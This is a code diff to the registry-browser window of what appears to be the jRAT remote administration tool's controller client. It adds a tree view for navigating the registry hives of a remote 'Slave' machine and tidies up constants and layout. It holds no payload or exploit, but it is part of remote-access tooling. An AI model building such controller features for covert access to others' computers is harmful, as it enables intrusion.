@@ -9,6 +9,7 @@ import java.awt.event.MouseEvent;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
+import java.util.Map;
 
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
@@ -33,6 +34,10 @@ import javax.swing.table.DefaultTableModel;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet79BrowseRegistry;
 import se.jrat.client.packets.outgoing.Packet80CustomRegQuery;
+import se.jrat.client.ui.components.pathtree.PathJTree;
+import se.jrat.client.ui.components.pathtree.PathListener;
+import se.jrat.client.ui.components.pathtree.PathTreeModel;
+import se.jrat.client.ui.components.pathtree.PathTreeNode;
 import se.jrat.client.ui.dialogs.DialogCustomRegQuery;
 import se.jrat.client.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.client.ui.renderers.table.RegistryTableRenderer;
@@ -47,10 +52,11 @@ public class FrameRemoteRegistry extends BaseFrame {
 	private Slave slave;
 	private DefaultTableModel model;
 
-	public static HashMap<Slave, FrameRemoteRegistry> instances = new HashMap<Slave, FrameRemoteRegistry>();
-	public static final ImageIcon regsz = IconUtils.getIcon("registry_ab");
-	public static final ImageIcon reg01 = IconUtils.getIcon("registry_01");
-	public static final ImageIcon folder = IconUtils.getIcon("folder");
+	public static final Map<Slave, FrameRemoteRegistry> instances = new HashMap<Slave, FrameRemoteRegistry>();
+	public static final ImageIcon REGSZ_ICON = IconUtils.getIcon("registry_ab");
+	public static final ImageIcon REG01_ICON = IconUtils.getIcon("registry_01");
+	public static final ImageIcon FOLDER_ICON = IconUtils.getIcon("folder");
+	public static final String[] ROOT_VALUES = new String[] { "HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };
 
 	private JTable table;
 	private JComboBox comboBox;
@@ -62,6 +68,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 	private JMenu mnBrowse;
 	private JMenuItem mntmStartup;
 	private RegistryTableRenderer renderer = new RegistryTableRenderer();
+	private PathJTree tree;
 
 	public DefaultTableModel getModel() {
 		return model;
@@ -95,7 +102,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 				txt.setText(value);
 			}
 		});
-		comboBox.setModel(new DefaultComboBoxModel(new String[] { "HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS", "HKEY_CURRENT_CONFIG" }));
+		comboBox.setModel(new DefaultComboBoxModel(ROOT_VALUES));
 		comboBox.setRenderer(getRenderer(comboBox));
 
 		JScrollPane scrollPane = new JScrollPane();
@@ -120,9 +127,70 @@ public class FrameRemoteRegistry extends BaseFrame {
 
 		JToolBar toolBar = new JToolBar();
 		toolBar.setFloatable(false);
+		
+		JScrollPane scrollPane_1 = new JScrollPane();
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 164, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(toolBar, GroupLayout.DEFAULT_SIZE, 370, Short.MAX_VALUE)).addGroup(gl_contentPane.createSequentialGroup().addComponent(txt, GroupLayout.DEFAULT_SIZE, 469, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnBack)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 550, Short.MAX_VALUE)).addGap(3)));
-		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(toolBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 259, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txt, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnBack)).addGap(7)));
+		gl_contentPane.setHorizontalGroup(
+			gl_contentPane.createParallelGroup(Alignment.TRAILING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addContainerGap()
+							.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, 164, GroupLayout.PREFERRED_SIZE)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(toolBar, GroupLayout.DEFAULT_SIZE, 370, Short.MAX_VALUE))
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addComponent(txt, GroupLayout.DEFAULT_SIZE, 469, Short.MAX_VALUE)
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(btnBack))
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addGap(2)
+							.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 197, Short.MAX_VALUE)
+							.addPreferredGap(ComponentPlacement.UNRELATED)
+							.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 341, GroupLayout.PREFERRED_SIZE)))
+					.addGap(3))
+		);
+		gl_contentPane.setVerticalGroup(
+			gl_contentPane.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addContainerGap()
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+						.addComponent(toolBar, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.UNRELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 258, Short.MAX_VALUE)
+						.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 258, Short.MAX_VALUE))
+					.addPreferredGap(ComponentPlacement.UNRELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(txt, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+						.addComponent(btnBack))
+					.addGap(7))
+		);
+		
+		tree = new PathJTree();
+		tree.setModel(new PathTreeModel(new PathTreeNode("root", null)));
+		tree.setDelimiter("\\");
+		tree.addPathListener(new PathListener() {
+			@Override
+			public void pathSelected(String path) {
+				System.out.println("Selected: " + path);
+				clear();
+				execute(path);
+				txt.setText(path);
+			}		
+		});
+		scrollPane_1.setViewportView(tree);
+		
+		for (String root : ROOT_VALUES) {
+			getTreeModel().addRoot(new PathTreeNode(root, IconUtils.getIcon("folder_network")));
+		}
+		
+		for (int i = 0; i < tree.getRowCount(); i++) {
+			tree.expandRow(i);
+		}
+		
+		tree.setRootVisible(false);
 
 		JButton btnReload = new JButton("Reload");
 		toolBar.add(btnReload);
@@ -350,5 +418,13 @@ public class FrameRemoteRegistry extends BaseFrame {
 
 	public RegistryTableRenderer getRenderer() {
 		return renderer;
+	}
+	
+	public PathTreeModel getTreeModel() {
+		return (PathTreeModel) tree.getModel();
+	}
+
+	public PathJTree getTree() {
+		return tree;
 	}
 }
